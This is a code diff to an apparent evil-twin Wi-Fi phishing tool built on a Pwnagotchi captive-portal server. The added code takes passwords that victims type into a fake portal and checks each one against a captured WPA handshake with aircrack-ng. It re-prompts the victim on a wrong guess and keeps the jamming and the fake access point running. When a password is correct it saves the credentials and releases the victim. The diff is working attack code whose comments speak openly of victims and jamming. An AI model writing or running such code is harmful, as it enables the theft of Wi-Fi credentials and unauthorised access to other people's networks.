@@ -5,6 +5,7 @@ import socketserver
 import os
 import sqlite3
 import subprocess
+import tempfile
 import urllib.parse
 import json
 from datetime import datetime
@@ -71,6 +72,61 @@ def save_credentials(username, password, user_agent, ip_address, portal_page):
         return False
 
 
+HANDSHAKE_DIR = "/etc/pwnagotchi/handshakes"
+META_FILE = "/tmp/fennec-mirage-meta.json"
+
+
+def _target_bssid():
+    try:
+        with open(META_FILE, encoding="utf-8") as f:
+            return (json.load(f).get("bssid") or "").upper()
+    except Exception:
+        return ""
+
+
+def _handshake_for(bssid):
+    key = bssid.replace(":", "").lower()
+    try:
+        for name in os.listdir(HANDSHAKE_DIR):
+            if name.lower().endswith(".pcap") and key in name.lower().replace(":", ""):
+                return os.path.join(HANDSHAKE_DIR, name)
+    except OSError:
+        pass
+    return None
+
+
+def verify_password(password):
+    """Check the submitted password against a captured handshake for the target.
+    True = correct, False = wrong (handshake valid, key rejected), None = cannot
+    check (no BSSID, no handshake, or no valid handshake to test against)."""
+    bssid = _target_bssid()
+    if not bssid or not password:
+        return None
+    pcap = _handshake_for(bssid)
+    if not pcap:
+        return None
+    wl = None
+    try:
+        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".txt") as wf:
+            wf.write(password + "\n")
+            wl = wf.name
+        r = subprocess.run(["aircrack-ng", "-a2", "-b", bssid, "-w", wl, pcap],
+                           capture_output=True, text=True, timeout=90)
+        if "KEY FOUND" in r.stdout:
+            return True
+        if "Passphrase not in dictionary" in r.stdout:
+            return False
+        return None
+    except Exception:
+        return None
+    finally:
+        if wl:
+            try:
+                os.unlink(wl)
+            except OSError:
+                pass
+
+
 def release_victim():
     """After a capture, let the success page load, then stop the jamming and the
     fake AP so the victim's device reconnects to the real network on its own.
@@ -124,8 +180,16 @@ class H(http.server.SimpleHTTPRequestHandler):
         ip_address = self.client_address[0]
         portal_page = self.path
 
-        # Save the submitted values to the local database.
-        if username or password:
+        # Verify the password against a captured handshake when we can.
+        if password:
+            if verify_password(password) is False:
+                # Wrong password: keep the attack running and re-prompt the victim.
+                print("[MIRAGE] Wrong password submitted; re-prompting.")
+                self.send_response(302)
+                self.send_header("Location", f"http://{BIND}/?error=1")
+                self.end_headers()
+                return
+            # Correct, or no handshake to verify against: accept it.
             save_credentials(username, password, user_agent, ip_address, portal_page)
             print(f"[MIRAGE] Credentials captured: {username}")
             release_victim()
